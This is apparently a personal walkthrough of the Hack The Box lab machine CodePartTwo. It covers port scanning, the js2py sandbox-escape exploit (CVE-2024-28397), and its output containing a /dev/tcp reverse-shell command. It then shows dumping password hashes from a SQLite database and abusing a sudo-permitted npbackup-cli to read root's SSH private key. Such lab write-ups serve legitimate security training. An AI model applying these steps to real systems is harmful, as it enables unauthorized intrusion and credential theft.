---
created: 2026-02-08
tags:
  - sapling
title: HTB - CodePartTwo
---

## How many open TCP ports are listening on CodePartTwo?

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ rustscan -a 10.129.232.59 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.59:22
Open 10.129.232.59:8000
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-08 06:33 -0500
Initiating Ping Scan at 06:33
Scanning 10.129.232.59 [4 ports]
Completed Ping Scan at 06:33, 0.47s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:33
Completed Parallel DNS resolution of 1 host. at 06:33, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 06:33
Scanning 10.129.232.59 [2 ports]
Discovered open port 22/tcp on 10.129.232.59
Discovered open port 8000/tcp on 10.129.232.59
Completed SYN Stealth Scan at 06:33, 0.36s elapsed (2 total ports)
Nmap scan report for 10.129.232.59
Host is up, received echo-reply ttl 63 (0.43s latency).
Scanned at 2026-02-08 06:33:45 EST for 1s

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

## What is the version of the js2py library being used by the application?

- Open website with port 8000
- Download app via "DOWNLOAD APP" button

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ unzip app.zip
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css
   creating: app/static/js/
  inflating: app/static/js/script.js
  inflating: app/app.py
   creating: app/templates/
  inflating: app/templates/dashboard.html
  inflating: app/templates/reviews.html
  inflating: app/templates/index.html
  inflating: app/templates/base.html
  inflating: app/templates/register.html
  inflating: app/templates/login.html
  inflating: app/requirements.txt
   creating: app/instance/
  inflating: app/instance/users.db

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

## Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses.

- Search by google

```
https://github.com/naclapor/CVE-2024-28397
```

## What is the name of the database used by the application?

- Setup

```js
┌──(kali㉿kali)-[~/Desktop]
└─$ git clone https://github.com/naclapor/CVE-2024-28397.git && cd CVE-2024-28397
Cloning into 'CVE-2024-28397'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 7.08 KiB | 7.08 MiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv init
Initialized project `cve-2024-28397`

┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv venv
Using CPython 3.13.11 interpreter at: /usr/bin/python3.13
Creating virtual environment at: .venv
Activate with: source .venv/bin/activate

┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv pip install requests
Resolved 5 packages in 76ms
Installed 5 packages in 3ms
 + certifi==2026.1.4
 + charset-normalizer==3.4.4
 + idna==3.11
 + requests==2.32.5
 + urllib3==2.6.3
```

- Netcat

```js
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ nc -lnvp 4444
```

- Exploit

```js
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv run python exploit.py --target http://10.129.232.59:8000/run_code --lhost 10.10.14.236 --lport 4444
============================================================
CVE-2024-28397 - js2py Sandbox Escape Exploit
Targets js2py <= 0.74
============================================================

[*] Generating exploit payload...
[+] Target URL: http://10.129.232.59:8000/run_code
[+] Reverse shell: (bash >& /dev/tcp/10.10.14.236/4444 0>&1) &
[+] Base64 encoded: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjM2LzQ0NDQgMD4mMSkgJg==
[+] Listening address: 10.10.14.236:4444

[!] Start your listener: nc -lnvp 4444

[*] Press Enter when your listener is ready...
[*] Sending exploit payload...
[+] Payload sent successfully!
[+] Response: {"error":"'NoneType' object is not callable"}

[+] Check your netcat listener for the reverse shell!
```

- Shell

```js
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Find the answer

```js
app@codeparttwo:~/app$ ls
ls
app.py  instance  __pycache__  requirements.txt  static  templates
app@codeparttwo:~/app$ ls instance
ls instance
users.db
```

## What is the recovered password for the user marco?

```js
cat instance/users.db
�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        code TEXT NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
)�0�CtableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(80) NOT NULL,
        password_hash VARCHAR(128) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
���'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5
```

- Crack with https://crackstation.net/

## Submit the flag located in the marco user's home directory.

- SSH with marco

```js
┌──(kali㉿kali)-[~]
└─$ ssh marco@10.129.232.59
The authenticity of host '10.129.232.59 (10.129.232.59)' can't be established.
ED25519 key fingerprint is: SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.59' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marco@10.129.232.59's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 08 Feb 2026 12:08:29 PM UTC

  System load:           0.0
  Usage of /:            57.4% of 5.08GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             233
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.59
  IPv6 address for eth0: dead:beef::250:56ff:feb0:4c15


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Feb 8 12:08:31 2026 from 10.10.14.236
```

- Find the flag

```js
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cat user.txt
```

## What is the full path to the backup utility that the marco user can run as root without a password?

```js
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

## What is the full backup path defined in the npbackup configuration file found in marco’s home directory?

```js
marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
...
```

## Submit the flag located in the root user's home directory.

- Modify paths: to /root

```js
marco@codeparttwo:~$ cp npbackup.conf npbackup1.conf
marco@codeparttwo:~$ vi npbackup1.conf
```

- Run backup

```js
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
2026-02-08 12:20:28,442 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-02-08 12:20:28,473 :: INFO :: Loaded config E1057128 in /home/marco/npbackup1.conf
2026-02-08 12:20:28,486 :: INFO :: Running backup of ['/root'] to repo default
2026-02-08 12:20:29,743 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-02-08 12:20:29,743 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-02-08 12:20:29,743 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-02-08 12:20:29,743 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-02-08 12:20:29,744 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-02-08 12:20:29,744 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-02-08 12:20:29,744 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-02-08 12:20:29,744 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-02-08 12:20:29,744 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.887 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot b6138687 saved
2026-02-08 12:20:31,106 :: INFO :: Backend finished with success
2026-02-08 12:20:31,109 :: INFO :: Processed 197.7 KiB of data
2026-02-08 12:20:31,109 :: ERROR :: Backup is smaller than configured minmium backup size
2026-02-08 12:20:31,109 :: ERROR :: Operation finished with failure
2026-02-08 12:20:31,110 :: INFO :: Runner took 2.625196 seconds for backup
2026-02-08 12:20:31,110 :: INFO :: Operation finished
2026-02-08 12:20:31,119 :: INFO :: ExecTime = 0:00:02.680163, finished, state is: errors.
```

- List

```js
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls
2026-02-08 12:22:26,589 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-02-08 12:22:26,621 :: INFO :: Loaded config E1057128 in /home/marco/npbackup1.conf
2026-02-08 12:22:26,633 :: INFO :: Showing content of snapshot latest in repo default
2026-02-08 12:22:29,073 :: INFO :: Successfully listed snapshot latest content:
snapshot b6138687 of [/root] at 2026-02-08 12:20:29.76029507 +0000 UTC by root@codeparttwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2026-02-08 12:22:29,074 :: INFO :: Runner took 2.441091 seconds for ls
2026-02-08 12:22:29,074 :: INFO :: Operation finished
2026-02-08 12:22:29,081 :: INFO :: ExecTime = 0:00:02.494678, finished, state is: success.
```

- Dump ssh private key

```js
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
<SNIP>
o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

- Copy ssh key

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nvim id_rsa

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ chmod 600 id_rsa
```

- SSH with root

```js
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh -i id_rsa root@10.129.232.59
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 08 Feb 2026 12:26:28 PM UTC

  System load:           0.01
  Usage of /:            57.6% of 5.08GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.129.232.59
  IPv6 address for eth0: dead:beef::250:56ff:feb0:4c15


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb 8 12:26:30 2026 from 10.10.14.236
root@codeparttwo:~# ls
root.txt  scripts
root@codeparttwo:~# cat root.txt
```
